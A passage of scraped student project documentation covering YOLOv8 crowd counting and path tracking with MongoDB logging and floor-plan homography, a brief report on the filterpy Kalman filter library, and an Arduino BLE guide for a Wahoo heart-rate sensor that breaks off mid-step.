YOLO('yolov8n.pt') # or use a different YOLO version # RTSP stream URL # Retrive the RTSP stream URL from iSpy or Wireshark # Replace the rtsp_url with your own RTSP stream URL rtsp_url = '' # Connect to the RTSP stream cap = cv2.VideoCapture(rtsp_url) #MongoDB connection client = MongoClient('') db = client[&quot;CrowdTracking&quot;] collection = db[&quot;Crowd&quot;] #variables for frame_id and date format frame_id = 0 current_date = date.today() update_interval = 1 # Update interval in seconds last_update_time = 0 while True: current_time = time.time() # Read the frame from the stream # If the frame was not read, then break the loop and print an error ret, frame = cap.read() if not ret: print('Error reading the frame') break # Perform YOLO detection results = model(frame) # Process results with box coordinates and confidence scores for result in results: boxes = result.boxes.cpu().numpy() for box in boxes: x1, y1, x2, y2 = map(int, box.xyxy[0]) conf = box.conf[0] cls = int(box.cls[0]) if cls == 0: # Assuming class 0 is person cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 2) cv2.putText(frame, f'Person: {conf:.2f}', (x1, y1 - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2) # This update allows to save the number of persons detected to MongoDB # for every update_interval seconds if current_time - last_update_time &lt; update_interval: now = datetime.now() # Save the number of persons detected to MongoDB # Save the frame_id, timestamp and the total number of persons detected data = { &quot;frame_id&quot;: frame_id, &quot;timestamp&quot;: now.strftime(&quot;%d/%m/%Y %H:%M:%S&quot;), &quot;total_persons&quot;: len(boxes) } collection.insert_one(data) last_update_time = current_time # Display the number of persons detected on the frame cv2.rectangle(frame, (10, 10), (310, 60), (255, 255, 255), -1) cv2.putText(frame, f'Total Persons: {len(boxes)}', (20, 40), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 0, 0), 2) frame_id += 1 # Display the frame cv2.imshow('Crowd Detection', frame) if cv2.waitKey(1) &amp; 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows()   ","version":"Next","tagName":"h2"},{"title":"Result​","type":1,"pageTitle":"Crowd Monitoring Overview","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview#result","content":"   Load YOLO model  model = YOLO('yolov8n.pt') # or use a different YOLO version # RTSP stream URL # Retrive the RTSP stream URL from iSpy or Wireshark # Replace the rtsp_url with your own RTSP stream URL rtsp_url = '' # Connect to the RTSP stream cap = cv2.VideoCapture(rtsp_url) #MongoDB connection client = MongoClient('') db = client[&quot;CrowdTracking&quot;] collection = db[&quot;Crowd&quot;] #variables for frame_id and date format frame_id = 0 current_date = date.today() update_interval = 1 # Update interval in seconds last_update_time = 0 while True: current_time = time.time() # Read the frame from the stream # If the frame was not read, then break the loop and print an error ret, frame = cap.read() if not ret: print('Error reading the frame') break # Perform YOLO detection results = model(frame) # Process results with box coordinates and confidence scores for result in results: boxes = result.boxes.cpu().numpy() for box in boxes: x1, y1, x2, y2 = map(int, box.xyxy[0]) conf = box.conf[0] cls = int(box.cls[0]) if cls == 0: # Assuming class 0 is person cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 2) cv2.putText(frame, f'Person: {conf:.2f}', (x1, y1 - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2) # This update allows to save the number of persons detected to MongoDB # for every update_interval seconds if current_time - last_update_time &lt; update_interval: now = datetime.now() # Save the number of persons detected to MongoDB # Save the frame_id, timestamp and the total number of persons detected data = { &quot;frame_id&quot;: frame_id, &quot;timestamp&quot;: now.strftime(&quot;%d/%m/%Y %H:%M:%S&quot;), &quot;total_persons&quot;: len(boxes) } collection.insert_one(data) last_update_time = current_time # Display the number of persons detected on the frame cv2.rectangle(frame, (10, 10), (310, 60), (255, 255, 255), -1) cv2.putText(frame, f'Total Persons: {len(boxes)}', (20, 40), cv2.FONT_HERSHEY_SIMPLEX, 1, (0, 0, 0), 2) frame_id += 1 # Display the frame cv2.imshow('Crowd Detection', frame) if cv2.waitKey(1) &amp; 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows()   Result​    ","version":"Next","tagName":"h2"},{"title":"Camo Studio - Virtue Camera on Yolov8​","type":1,"pageTitle":"Crowd Monitoring Overview","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview#camo-studio---virtue-camera-on-yolov8","content":" We will use Camo Studio app. We will need to download it on your mobile device and PC via App store/Google Play. After setup the app via QR code, we can now use our mobile device as a virtue camera for VS Code.  python import cv2 import numpy as np from ultralytics import YOLO from collections import defaultdict from utils import calculateHomography, transformPoints from pymongo import MongoClient import time as time_module from datetime import datetime # Load the YOLO model model = YOLO(&quot;yolov8n.pt&quot;) # Connect to the MongoDB database # and set up data recording client = MongoClient(&quot;&quot;) db = client[&quot;Crowd_Monitoring&quot;] collection = db[&quot;Crowd_Count&quot;] lastRecorded = time_module.time() # Connect to the virtue camera using code &quot;1&quot;. Code &quot;0&quot; for webcam rtspUrl = 1 cap = cv2.VideoCapture(rtspUrl) trackHistory = defaultdict(list) # Load the floor image from floorReplica import floorReplica canvasHeight = 1000 canvasWidth = 700 tilesX = 25 tilesY = 15 floorImage = floorReplica(canvasHeight, canvasWidth, tilesX, tilesY, rtspUrl) height, width, channels = floorImage.shape # Define the codec and create a VideoWriter object fourcc = cv2.VideoWriter_fourcc(*'mp4v') video = cv2.VideoWriter('output.mp4', fourcc, 20.0, (width, height)) # Define the source and destination points for the homography matrix # Calculate the homography matrix ptsSRC = np.array([[28, 1158], [2120, 1112], [1840, 488], [350, 518], [468, 1144]]) ptsDST = np.array([[0, 990], [699, 988], [693, 658], [0, 661], [141, 988]]) homographyMatrix = calculateHomography(ptsSRC, ptsDST) # Main loop while True: #while cap.isOpened(): success, frame = cap.read() results = model.track(frame, persist=True, show=False, imgsz=1280, verbose=True) annotatedFrame = floorImage.copy() # Process camera results with box coordinates and confidence scores for result in results: boxes_camera = result.boxes.cpu().numpy() for box in boxes_camera: x1, y1, x2, y2 = map(int, box.xyxy[0]) conf = box.conf[0] cls = int(box.cls[0]) if cls == 0: # Assuming class 0 is person cv2.rectangle(frame, (x1, y1), (x2, y2), (0, 255, 0), 2) cv2.putText(frame, f'Person: {conf:.2f}', (x1, y1 - 10), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (0, 255, 0), 2) # if results[0].boxes is not None and hasattr(results[0].boxes, 'id'): try: if results[0].boxes is not None: # Check if the boxes attribute contains IDs if hasattr(results[0].boxes, 'id'): # Check if there are any detected boxes if results[0].boxes.id.numel() &gt; 0: # Convert tensor to NumPy array boxes = results[0].boxes.xywh.cpu().numpy() trackIDs = results[0].boxes.id.cpu().numpy() print('Track IDs:', trackIDs) # Copy floorImage only if objects are detected annotatedFrame = floorImage.copy() for trackID in np.unique(trackIDs): history = trackHistory[trackID] if len(history) &gt; 1: points = np.array(history, dtype=np.int32) newPoints = transformPoints(points, homographyMatrix) newPoints = newPoints.astype(np.int32) cv2.polylines(annotatedFrame, [newPoints], isClosed=False, color=(0, 0, 255), thickness=2) for box, trackID in zip(boxes, trackIDs): x, y, w, h = box center = (int(x), int(y + h / 2)) trackHistory[trackID].append(center) if len(trackHistory[trackID]) &gt; 50: trackHistory[trackID].pop(0) currentTime = time_module.time() print(currentTime) # Record the number of people in the frame every second if currentTime - lastRecorded &gt; 1: frameId = int(cap.get(cv2.CAP_PROP_POS_FRAMES)) totalPeople = len(np.unique(trackIDs)) print(&quot;People&quot;, totalPeople) # Convert current time to human-readable format timestamp = time_module.strftime(&quot;%d-%m-%Y %H:%M:%S&quot;, time_module.localtime(currentTime)) print(timestamp) record = { &quot;frameId&quot;: frameId, &quot;timestamp&quot;: timestamp, &quot;totalPeople&quot;: totalPeople } print(&quot;Before inserting record into MongoDB&quot;) collection.insert_one(record) print(&quot;After inserting record into MongoDB&quot;) lastRecorded = currentTime print(&quot;People 2&quot;, totalPeople) video.write(annotatedFrame) else: print(&quot;No objects detected. No IDs available.&quot;) else: print(&quot;The 'id' attribute is not present in the boxes.&quot;) else: print(&quot;No boxes detected. The 'boxes' attribute is None.&quot;) except AttributeError as e: print(f&quot;An AttributeError occurred: {e}&quot;) except Exception as e: print(f&quot;An unexpected error occurred: {e}&quot;) cv2.imshow(&quot;Map Tracking&quot;, annotatedFrame) cv2.imshow(&quot;Camera Feed&quot;, frame) if cv2.waitKey(1) &amp; 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows()   ","version":"Next","tagName":"h2"},{"title":"Result​","type":1,"pageTitle":"Crowd Monitoring Overview","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview#result-2","content":"   ","version":"Next","tagName":"h3"},{"title":"Visualization​","type":1,"pageTitle":"Crowd Monitoring Overview","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview#visualization","content":" We will need to visualize data to display and analysis on dashboard.  The idea is fetching the tracking path from processed data, plotting their points from camera footage onto 2D floor plan.  From that, we can do flow analysis and heatmap to evaluate crowd density.  This is a powerful information. It will allow you to easily recognize common pattern of congestion at particular times of day or places. Moreover, it can improve your business performance by arranging staffs and products, make inform decisions to drive sales.  Your security camera images are distorted. For example, a one pixel movement at the top of your image corresponds to a much larger movement in the real world than a one pixel movement at the bottom of your image.  Homography Transformation is the solution for camera mapping.  Source: https://zbigatron.com/mapping-camera-coordinates-to-a-2d-floor-plan/  We need to calculate corresponse mapping matrix H for homography transformation. We can create the matrix by choosing pixel coordinates in camera view and corresponding pixel coordinates in matching image (at least 4 points).  Use matrix H to performed track points transformation to plot path on map 2D floor plane.    TESTING  Fetching and draw track path of camera view  python import cv2 import numpy as np from ultralytics import YOLO from collections import defaultdict # Initialize YOLO model model = YOLO(&quot;yolov8n.pt&quot;) # Open video file video_path = &quot;/content/people-walking.mp4&quot; cap = cv2.VideoCapture(video_path) # Initialize track history track_history = defaultdict(list) # Initialize video writer (optional, if you want to save the output) fourcc = cv2.VideoWriter_fourcc(*&quot;mp4v&quot;) video_writer = cv2.VideoWriter('/content/tracking_white_output.mp4', fourcc, 20.0, (int(cap.get(3)), int(cap.get(4)))) # Assigning the points for Region of Interest region_points = [(20, 500), (1080, 500), (1080, 1000), (20, 1000)] # Initialize the ObjectCounter with the model's class names # Init Object Counter counter = solutions.ObjectCounter( view_img=True, view_in_counts\t= True, view_out_counts\t= True, reg_pts=region_points, names=model.names, #draw_tracks=True, line_thickness=2, ) while cap.isOpened(): success, frame = cap.read() if not success: break # Get the frame dimensions height, width, channels = frame.shape # Create a white frame of the same size white_frame = np.ones((height, width, channels), dtype=np.uint8) * 255 # Track objects in the frame results = model.track(frame, persist=True, show=False, imgsz=1280, verbose=True) # Extract tracking results boxes = results[0].boxes.xywh.cpu().numpy() track_ids = results[0].boxes.id.int().cpu().numpy() # Draw paths for each track #frame_with_counting = counter.start_counting(frame, results) #annotated_frame = frame_with_counting.copy() # Make a copy of the frame to draw paths on annotated_frame = white_frame # Make a copy of the frame to draw paths on for track_id in np.unique(track_ids): # Get the history for this track_id history = track_history[track_id] if len(history) &gt; 1: points = np.array(history, dtype=np.int32) # Draw the path (line connecting the points) cv2.polylines(annotated_frame, [points], isClosed=False, color=(0, 255, 0), thickness=2) # Update the track history with new positions for box, track_id in zip(boxes, track_ids): x, y, w, h = box center = (int(x), int(y + h / 2)) track_history[track_id].append(center) # Limit history length if len(track_history[track_id]) &gt; 50: track_history[track_id].pop(0) # Save or display the frame video_writer.write(annotated_frame) # Release resources cap.release() video_writer.release() cv2.destroyAllWindows()   Draw floor plan  python from google.colab.patches import cv2_imshow import numpy as np def create_floor_replica(canvas_height, canvas_width, num_tiles_x, num_tiles_y): &quot;&quot;&quot; Create a floor replica with a white canvas and rectangular tiles. Parameters: canvas_height (int): Height of the canvas. canvas_width (int): Width of the canvas. num_tiles_x (int): Number of tiles horizontally. num_tiles_y (int): Number of tiles vertically. Returns: floor_image (numpy.ndarray): The generated floor image with tiles. &quot;&quot;&quot; # Calculate the height of each tile tile_height = canvas_height // num_tiles_y # Calculate the width of each tile tile_width = canvas_width // num_tiles_x # Create a white canvas floor_image = np.ones((canvas_height, canvas_width, 3), dtype=np.uint8) * 255 # Draw the tiles (rectangles) for y in range(0, canvas_height, tile_height): for x in range(0, canvas_width, tile_width): cv2.rectangle(floor_image, (x, y), (x + tile_width, y + tile_height), (0, 0, 0), 1) return floor_image # Example usage if __name__ == &quot;__main__&quot;: # Define the canvas size (height and width) canvas_height = 1000 # Example height canvas_width = 700 # Example width # Number of tiles horizontally and vertically num_tiles_x = 25 num_tiles_y = 15 # Create the floor replica floor_image = create_floor_replica(canvas_height, canvas_width, num_tiles_x, num_tiles_y) # Display the result cv2_imshow(floor_image) cv2.imwrite('/content/floor_replica.png', floor_image) cv2.waitKey(0) cv2.destroyAllWindows()   Perform transformation and draw tracking path on floor plan  python import cv2 import numpy as np from ultralytics import YOLO from collections import defaultdict # Initialize YOLO model model = YOLO(&quot;yolov8n.pt&quot;) # Open video file video_path = &quot;/content/people-walking.mp4&quot; cap = cv2.VideoCapture(video_path) # Initialize track history track_history = defaultdict(list) # Load the base image base_image_path = '/content/floor_replica.png' floor_frame = cv2.imread(base_image_path) # Ensure the base image is loaded if floor_frame is None: raise ValueError(f&quot;Could not load the base image from {base_image_path}&quot;) # Get the dimensions of the base image height, width, channels = floor_frame.shape # Initialize video writer with the dimensions of the base image fourcc = cv2.VideoWriter_fourcc(*&quot;mp4v&quot;) video_writer = cv2.VideoWriter('/content/2D_map_output.mp4', fourcc, 20.0, (width, height)) # Matching points from 2 views # Provide points from image 1 pts_src = np.array([[28, 1158], [2120, 1112], [1840, 488], [350, 518], [468, 1144]]) # Corresponding points from image 2 pts_dst = np.array([[0, 990], [699, 988], [693, 658], [0, 661], [141, 988]]) # Define homography functions def calculate_homography(pts_src, pts_dst): return cv2.findHomography(pts_src, pts_dst)[0] def transform_points(points, homography_matrix): points = np.concatenate([points, np.ones((points.shape[0], 1))], axis=1) # Add a column of ones for homogenous coordinates transformed_points = homography_matrix.dot(points.T).T # Apply homography transformed_points /= transformed_points[:, 2][:, np.newaxis] # Normalize by the third coordinate return transformed_points[:, :2] # Calculate the homography matrix once, since pts_src and pts_dst are constant homography_matrix = calculate_homography(pts_src, pts_dst) # Process each frame while cap.isOpened(): success, frame = cap.read() if not success: break # Track objects in the frame results = model.track(frame, persist=True, show=False, imgsz=1280, verbose=True) # Extract tracking results boxes = results[0].boxes.xywh.cpu().numpy() track_ids = results[0].boxes.id.int().cpu().numpy() # Use a fresh copy of the base image annotated_frame = floor_frame.copy() for track_id in np.unique(track_ids): # Get the history for this track_id history = track_history[track_id] if len(history) &gt; 1: points = np.array(history, dtype=np.int32) # Transform the points using the precomputed homography matrix new_points = transform_points(points, homography_matrix) new_points = new_points.astype(np.int32) # Draw the path (line connecting the points) cv2.polylines(annotated_frame, [new_points], isClosed=False, color=(0, 255, 0), thickness=2) # Update the track history with new positions for box, track_id in zip(boxes, track_ids): x, y, w, h = box center = (int(x), int(y + h / 2)) track_history[track_id].append(center) # Limit history length if len(track_history[track_id]) &gt; 50: track_history[track_id].pop(0) # Save the annotated frame to the video video_writer.write(annotated_frame) # Release resources cap.release() video_writer.release() cv2.destroyAllWindows()   ","version":"Next","tagName":"h2"},{"title":"Results​","type":1,"pageTitle":"Crowd Monitoring Overview","url":"/redback-documentation/docs/project-4/Crowd-Monitoring/Crowd-Monitoring-Overview#results","content":"  ","version":"Next","tagName":"h2"},{"title":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis","content":"","keywords":"","version":"Next"},{"title":"1. About the filterpy Package​","type":1,"pageTitle":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis#1-about-the-filterpy-package","content":" filterpy is a Python library developed by Roger R. Labbe Jr. that provides easy-to-use implementations of various filtering methods, including the Kalman filter. The package is well-documented and widely used in the scientific and engineering communities for state estimation problems.  ","version":"Next","tagName":"h2"},{"title":"2. Key Features​","type":1,"pageTitle":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis#2-key-features","content":" The filterpy package offers several powerful features:  Kalman Filtering: Supports both linear and extended Kalman filters.Provides efficient methods for filtering and prediction. Unscented Kalman Filtering: Ideal for nonlinear systems, using the unscented transform. Other Filters: Includes particle filters, H-infinity filters, and Bayesian filters. Built-in Support for Common Systems: Predefined models for common systems, such as constant velocity and constant acceleration models.  ","version":"Next","tagName":"h2"},{"title":"3. Applications in Data Analysis​","type":1,"pageTitle":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis#3-applications-in-data-analysis","content":" Noise Filtering: The Kalman filter helps in reducing noise from sensor data, producing cleaner and more accurate insights. State Estimation: The filter is useful for estimating hidden variables in dynamic systems, such as velocity or position. Real-Time Processing: The filter's efficiency makes it suitable for real-time applications, such as monitoring and alerting systems. Trajectory Prediction: The Kalman filter can be used to predict future positions or states based on past observations, which is useful in tracking and navigation applications.  ","version":"Next","tagName":"h2"},{"title":"4. Implementation and Integration​","type":1,"pageTitle":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis#4-implementation-and-integration","content":" To integrate the filterpy package into our workflow, we can follow these steps:  Install the Package: Install filterpy using pip: pip install filterpy Set Up the Filter: Initialize and configure the Kalman filter for our specific system. Apply the Filter: Use the filter to process our sensor data, estimating hidden states and reducing noise. Analyze the Results: Use the filtered data for further analysis, visualization, or prediction.  ","version":"Next","tagName":"h2"},{"title":"5. Conclusion​","type":1,"pageTitle":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis#5-conclusion","content":" The filterpy package provides robust and easy-to-use Kalman filtering capabilities that align well with our data analysis needs. By leveraging this package, we can enhance our workflows, particularly in areas involving noisy sensor data or dynamic systems.  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Report on Implementing filterpy for Enhanced Kalman Filtering in Data Analysis","url":"/redback-documentation/docs/project-4/iot/Filterpy_library_for data_analysis#references","content":" GitHub RepositoryDocumentationOnline Article on Using FilterPyCode Example ","version":"Next","tagName":"h2"},{"title":"Heart rate initializing documentation","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor","content":"","keywords":"","version":"Next"},{"title":"Overview​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#overview","content":" This comprehensive guide aims to help junior students understand how to use the Wahoo TICKR heart rate sensor with the Arduino Nano 33 IoT. The objective is to connect the sensor, read the heart rate data, and display it using the Arduino IDE and the BLE (Bluetooth Low Energy) library.  ","version":"Next","tagName":"h2"},{"title":"1. Materials Needed​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#1-materials-needed","content":" ","version":"Next","tagName":"h2"},{"title":"1. Wahoo TICKR Heart Rate Sensor​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#1-wahoo-tickr-heart-rate-sensor","content":" Description: The Wahoo TICKR is a wearable sensor that measures your heart rate and transmits the data wirelessly via Bluetooth. It is typically worn on the chest and can be used during various physical activities to monitor heart rate in real-time.Key Features: Accurate heart rate monitoring, Bluetooth and ANT+ connectivity, long battery life.Setup: Attach the sensor to the provided chest strap, ensuring the electrodes are in contact with your skin. Secure the strap snugly around your chest.  ","version":"Next","tagName":"h3"},{"title":"2. Arduino Nano 33 IoT​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#2-arduino-nano-33-iot","content":" Description: This is a compact microcontroller board with built-in Bluetooth Low Energy (BLE) capabilities. It is designed for IoT (Internet of Things) projects, making it ideal for connecting to sensors and other BLE devices.Key Features: ARM Cortex-M0+ processor, built-in Wi-Fi and BLE, 48 MHz clock speed, 256 KB flash memory.Setup: Familiarize yourself with the board layout, including the micro-USB port, power pins, digital I/O pins, and the onboard LED.  ","version":"Next","tagName":"h3"},{"title":"3. USB Cable for Arduino Nano 33 IoT​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#3-usb-cable-for-arduino-nano-33-iot","content":" Description: A USB cable is required to connect the Arduino Nano 33 IoT to your computer for programming and power supply. It typically uses a micro-USB or USB-C connector, depending on the version of the board.Setup: Ensure you have the appropriate cable type for your board and connect it to a USB port on your computer.  ","version":"Next","tagName":"h3"},{"title":"4. Arduino IDE installed on your computer​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#4-arduino-ide-installed-on-your-computer","content":" Description: The Arduino Integrated Development Environment (IDE) is a software application used to write, upload, and debug code on Arduino boards. It supports a wide range of Arduino boards and provides an easy-to-use interface for programming.Key Features: Code editor, built-in libraries, board manager, serial monitor.Setup: Ensure you have the latest version of the Arduino IDE installed. You can download it from the Arduino official website.  ","version":"Next","tagName":"h3"},{"title":"2. Wahoo TICKR LED Indicators​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#2-wahoo-tickr-led-indicators","content":" Understanding the LED indicators on the Wahoo TICKR sensor is crucial for troubleshooting and confirming the sensor's status:  Red and Blue lights blink together: Indicates that the sensor is powered on and ready to use. Troubleshooting: If the lights do not blink together when the sensor is turned on, check the battery or ensure the sensor is properly attached to the chest strap. Blue light blinks continuously: The sensor is actively searching for a heart rate. This usually occurs when the sensor is not properly attached to the body or if it is having trouble detecting a pulse. Troubleshooting: Ensure the sensor is snugly attached and the electrodes are in contact with your skin. Moistening the electrodes slightly can help improve contact. Blue and Red lights blink alternately: The sensor is successfully detecting and transmitting heart rate data. This is the normal operating mode when the sensor is properly attached and functioning correctly. Troubleshooting: If you do not see this pattern during use, recheck the sensor attachment and ensure it is within the transmission range of the receiving device.  ","version":"Next","tagName":"h2"},{"title":"3. Step-by-Step Instructions​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#3-step-by-step-instructions","content":" ","version":"Next","tagName":"h2"},{"title":"1. Setting Up Arduino IDE​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#1-setting-up-arduino-ide","content":" a. Install Arduino IDE​  Download and Install​  Windows: After downloading the installer, run the executable file and follow the on-screen instructions to complete the installation. Steps: Download the installer.Double-click the downloaded file.Follow the installation wizard, accepting the default options.Click 'Install' and wait for the process to complete. MacOS: Open the downloaded file and drag the Arduino application to your Applications folder. Double-click the application to launch it. Steps: Download the disk image (.dmg) file.Open the disk image and drag the Arduino IDE icon to the Applications folder.Launch the Arduino IDE from the Applications folder. Linux: Extract the downloaded tar.gz file and run the install.sh script in a terminal. You may need to provide administrative permissions. Steps: Download the tar.gz file.Open a terminal and navigate to the download directory.Extract the file using tar -xvf filename.tar.gz.Run the installation script using ./install.sh.  Verify Installation​  Once installed, open the Arduino IDE. You should see the main window with options to create a new sketch, open existing ones, and access the library manager. Ensure there are no error messages upon startup.  Steps: Launch the Arduino IDE.Verify that the IDE opens without error messages.Check the menus and toolbars to ensure all options are available.  b. Install ArduinoBLE Library​  Open Arduino IDE​  Launch the Arduino IDE on your computer.  Library Manager​  Navigate to Sketch &gt; Include Library &gt; Manage Libraries. This will open the Library Manager window where you can search for and install additional libraries.  Steps: Click on Sketch in the menu bar.Select Include Library.Click on Manage Libraries.  Search and Install​  In the Library Manager, type ArduinoBLE in the search bar. Locate the ArduinoBLE library in the search results and click the Install button.  Steps: Type ArduinoBLE in the search bar.Find the library in the list and click Install.Wait for the installation to complete.  Usage​  This library provides essential functions for BLE operations on the Arduino Nano 33 IoT, including scanning for devices, connecting, and communicating with BLE peripherals.  ","version":"Next","tagName":"h3"},{"title":"4. Initializing BLE on Arduino Nano 33 IoT​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#4-initializing-ble-on-arduino-nano-33-iot","content":" To use the BLE capabilities of the Arduino Nano 33 IoT, you need to initialize the BLE module.  a. Begin BLE Service​  Initialization​  Start by initializing the BLE service in your Arduino sketch. This sets up the BLE module to begin communication. Use a function to initialize the BLE hardware and check if the initialization is successful. If not, print an error message to the Serial Monitor and halt the program.  Steps: Call a function to initialize the BLE module, such as BLE.begin().Check the return value of the initialization function.If initialization fails, use Serial.print to display an error message and stop further execution.  b. Scan for Heart Rate Service​  UUID Scanning​  Configure the BLE module to scan specifically for devices that advertise the Heart Rate service, identified by the UUID &quot;180D&quot;. Use a function to start scanning for BLE devices with the Heart Rate service UUID. This helps to quickly identify the Wahoo TICKR among other BLE devices in the vicinity.  Steps: Use a scanning function to look for devices with the UUID &quot;180D&quot;.Monitor the scanning process to ensure the target device is detected.Print messages to the Serial Monitor to indicate the scanning status.  ","version":"Next","tagName":"h3"},{"title":"5. Connecting to Wahoo TICKR​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#5-connecting-to-wahoo-tickr","content":" After initializing the BLE module, the next step is to establish a connection with the Wahoo TICKR heart rate sensor.  a. Scan and Detect Device​  Continuous Scanning​  Continuously scan for BLE devices within range using a loop. Use a loop to check for nearby BLE devices and identify the Wahoo TICKR by its local name.  Steps: Implement a loop that repeatedly scans for BLE devices.Use a function to retrieve detected devices.Compare each device's local name to identify the Wahoo TICKR.  Device Identification​  Ensure that the detected device is the Wahoo TICKR by comparing its local name. This prevents connecting to the wrong device. Retrieve the local name of the BLE device and compare it with the expected name.  Steps: Retrieve the local name of each detected device using a function like peripheral.localName().Compare the retrieved name with the expected name, such as &quot;TICKR 0A5B&quot;.Print messages to the Serial Monitor to indicate if the target device is found.  b. Establish Connection​  Stop Scanning​  Once the Wahoo TICKR is detected, stop scanning to conserve power and processing resources. Use a function to stop the BLE scanning process.  Steps: Call a function to stop scanning, such as BLE.stopScan().Confirm that scanning has stopped by printing a message to the Serial Monitor.  Attempt Connection​  Try to establish a connection with the Wahoo TICKR. Use a function to connect to the detected BLE device and handle connection success or failure.  Steps: Call a function to connect to the device, such as peripheral.connect().Check the connection status and print messages to the Serial Monitor to indicate success or failure.If the connection fails, retry the connection or notify the user of the issue.  ","version":"Next","tagName":"h3"},{"title":"6. Discovering Services and Characteristics​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#6-discovering-services-and-characteristics","content":" Upon establishing a connection with the Wahoo TICKR, discover its services and characteristics to access the heart rate data.  a. Discover Attributes​  Service Discovery​  Discover the services provided by the Wahoo TICKR. Use a function to discover all attributes (services and characteristics) provided by the connected device.  Steps: Call a function to discover attributes, such as peripheral.discoverAttributes().Confirm the discovery process by printing messages to the Serial Monitor.  Characteristic Discovery​  Identify the characteristic for heart rate measurement within the Heart Rate service (UUID &quot;2A37&quot;). Retrieve the Heart Rate service and its characteristics using the appropriate functions.  Steps: Retrieve the Heart Rate service using a function, such as peripheral.service(&quot;180D&quot;).Within the service, retrieve the heart rate characteristic using a function, such as service.characteristic(&quot;2A37&quot;).Print messages to the Serial Monitor to confirm the discovery of the heart rate characteristic.  b. Subscribe to Heart Rate Characteristic​  Subscription​  Subscribe to the heart rate characteristic to start receiving data updates. Use a function to subscribe to notifications for the heart rate characteristic.  Steps: Call a function to subscribe to the characteristic, such as characteristic.subscribe().Confirm the subscription by printing messages to the Serial Monitor.Ensure that the Arduino is set to receive notifications when the heart rate data is updated.  ","version":"Next","tagName":"h3"},{"title":"7. Reading and Displaying Heart Rate Data​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#7-reading-and-displaying-heart-rate-data","content":" With the subscription in place, the Arduino can start receiving and processing heart rate data from the Wahoo TICKR.  a. Poll for Data Updates​  Polling​  Continuously poll the BLE characteristic for new data. Use a loop to call functions that process BLE events and check for updates in the heart rate characteristic.  Steps: Implement a loop that regularly calls a function to process BLE events, such as BLE.poll().Within the loop, check if the heart rate characteristic has been updated using a function, such as characteristic.valueUpdated().Print messages to the Serial Monitor to indicate when new data is received.  b. Extract and Print Heart Rate​  Data Extraction​  Extract the heart rate value from the received data. Use a function to retrieve the current value of the heart rate characteristic and process the data to extract the heart rate value.  Steps: Call a function to get the current value of the characteristic, such as characteristic.value().Extract the heart rate value from the data array. The heart rate value is typically located at a specific index.Convert the extracted value to a human-readable format.  Display Data​  Print the heart rate value to the Serial Monitor. Use Serial.print and Serial.println functions to display the heart rate data in the Serial Monitor.  Steps: Use Serial.print to display the heart rate value.Use Serial.println to print the value with a new line.Ensure the Serial Monitor baud rate is set to 9600 for proper communication.  ","version":"Next","tagName":"h3"},{"title":"8. Uploading the Code and Monitoring Output​","type":1,"pageTitle":"Heart rate initializing documentation","url":"/redback-documentation/docs/project-4/iot/documentation -heart-sensor#8-uploading-the-code-and-monitoring-output","content":" To execute the program and view the heart rate data:  a. Connect Arduino to Computer​  USB Connection​  Use a USB cable to connect your Arduino Nano 33 IoT to your computer.  Steps: Ensure the correct cable type (micro-USB or USB-C) is used.Connect one end of the cable to the Arduino and the other end to a USB port on your computer.Verify that the Arduino is powered on and recognized by the computer.  b. Select Board and Port​  Board Selection​  In the Arduino IDE, go to Tools &gt; Board and select Arduino Nano 33 IoT.  Steps: Click on Tools in the menu bar.Select Board.Choose 